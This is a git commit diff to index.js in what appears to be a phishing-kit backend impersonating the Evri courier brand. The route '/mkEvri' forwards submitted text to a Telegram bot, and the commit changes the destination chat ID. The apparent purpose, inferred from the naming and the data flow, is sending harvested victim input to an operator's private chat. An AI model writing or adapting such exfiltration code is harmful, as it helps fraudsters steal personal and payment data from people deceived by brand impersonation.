5ac4e96885607cd4305b4f64c1d6184978d6f3c5
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-09-04 16:22:01 +0100

    make

--- index.js
+++ index.js
@@ -13300,7 +13300,7 @@ app.post("/mkEvri", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: "-443819992",
+              chat_id: 729640669,
               text: `Evri:\n${originalText}`,
               parse_mode: "Markdown",
             }
